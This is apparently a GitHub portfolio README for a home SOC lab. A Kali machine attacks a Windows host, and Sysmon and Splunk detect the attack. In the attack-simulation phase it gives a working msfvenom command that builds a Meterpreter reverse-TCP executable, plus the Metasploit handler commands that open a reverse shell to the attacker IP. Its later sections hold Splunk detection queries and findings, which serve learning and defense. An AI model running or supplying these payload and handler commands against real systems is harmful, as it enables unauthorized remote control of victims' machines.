# Basic-Home-Lab
# Project Overview
A comprehensive home lab setup demonstrating cybersecurity monitoring, attack simulation, and incident detection using enterprise-grade security tools. This project showcases practical SOC analyst skills in a controlled environment.

# Lab Architecture
<img width="520" height="311" alt="basichomelab drawio" src="https://github.com/user-attachments/assets/2f55ea00-f378-4e7f-bb1d-0218613cdbe8" />

# Components Used

# 1. Windows Host Machine
Purpose: Target system for attack simulation \
IP Address: 192.168.10.11

# Tools Installed:
Sysmon for advanced process monitoring \
Splunk Universal Forwarder \
Windows Event Logs

# 2. Kali Linux
Purpose: Attacker machine for penetration testing \
IP Address: 192.168.10.10 

# Tools Used:
Metasploit Framework \
Msfvenom for payload creation \
Network scanning tools (nmap) 


# 3. Splunk Enterprise
Purpose: Security Information and Event Management (SIEM) \
Function: Centralized log collection, correlation, and analysis 

# 4. Sysmon
Purpose: System Monitor for detailed process tracking \
Configuration: Enhanced logging for process creation, network connections, and file activity 

# Implementation Steps

# Phase 1: Environment Setup

# Windows Host Configuration
Installed Windows 10/11 with basic applications \
Configured network settings (static IP: 192.168.10.11) \
Disabled Windows Firewall for testing purposes \
Installed and configured Sysmon with comprehensive logging \
Deployed Splunk Universal Forwarder for log collection  

# Kali Linux Setup
Installed Kali Linux in virtualized environment \
Configured network (static IP: 192.168.10.10) \
Updated Metasploit and security tools \
Verified network connectivity between systems  
 
# Splunk Installation
Deployed Splunk Enterprise instance \
Configured data inputs for Windows Event Logs and Sysmon \
Created custom dashboards for security monitoring \
Set up log forwarding from Windows host  


# phase 2: Attack Simulation & Detection
# Step 1: Payload Generation
Kali Linux Command: \
**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=4444 -f exe -o malicious_payload.exe

# Step 2: Metasploit Handler Setup**

Kali Linux Commands: \
**msfconsole 
use exploit/multi/handler \
set PAYLOAD windows/x64/meterpreter/reverse_tcp \
set LHOST 192.168.10.10 \
set LPORT 4444 \
exploit**

# Step 3: Payload Execution
Transferred malicious_payload.exe to Windows host  \
Executed payload, establishing reverse shell connection \ 
Verified Meterpreter session establishment

<img width="960" height="141" alt="establish connection" src="https://github.com/user-attachments/assets/0cc2701d-2ebf-49e8-a300-6464d29370ad" />


# phase 3 Security Monitoring & Detection
**Splunk Detection Queries**
1. Process Creation Monitoring
index=endpoint EventCode=1 
| table _time, Image, CommandLine, User, ParentCommandLine
| search Image="*malicious_payload.exe*"

2. Process Injection Detection
index=endpoint EventCode=10 
| search SourceImage="*malicious_payload.exe*" 
| spath
| table _time, SourceImage, TargetImage, GrantedAccess, CallTrace

4. Network Connection Correlation
index=endpoint (EventCode=3 OR EventCode=1) 
| search DestinationIp="192.168.10.10" OR Image="*malicious_payload.exe*"
| table _time, EventCode, Image, DestinationIp, DestinationPort, User


# Phase 4 Key Findings & Observations

**Attack Indicators Detected:**  \
Suspicious Process Creation: malicious_payload.exe execution.  \
Process Injection Attempts: DLL injection into system processes  \
Reverse Shell Connections: Established connections to attacker IP  \
Multiple Connection Attempts: Several SYN_SENT attempts before successful connection  

**SOC Analyst Insights:**  \
Detection Capability: Sysmon provided detailed process and network telemetry  \
SIEM Correlation: Splunk successfully correlated events across multiple data sources \
False Positives: Required tuning to distinguish legitimate from malicious activity \
Incident Timeline: Able to reconstruct attack sequence from initial compromise to established persistence

# Skills Demonstrated

**Technical Skills:** \
Enterprise security tool deployment (Splunk, Sysmon) \
Penetration testing and attack simulation \
Log analysis and SIEM query development \
Network traffic analysis \
Incident investigation and timeline reconstruction

**SOC Analyst Skills:** \
Threat detection and analysis \
Security monitoring configuration \
Attack vector understanding \
Incident response procedures \
Documentation and reporting 

**Future Enhancements**  \
Advanced Detection Rules: Implement Sigma rules for automated alerting \
ELK Stack Integration: Add Elasticsearch for complementary analysis \
Threat Intelligence: Integrate IOC feeds for enhanced detection \
Automated Response: Implement SOAR playbooks for incident response \
Multi-vector Attacks: Simulate additional attack techniques (phishing, lateral movement)

# Conclusion
This home lab successfully demonstrates a complete cyber attack lifecycle from initial compromise to detection. The integration of Sysmon for detailed endpoint monitoring and Splunk for centralized security analytics provides a realistic SOC environment. The project showcases practical skills in both offensive security testing and defensive security monitoring, making it an valuable addition to any SOC analyst portfolio.
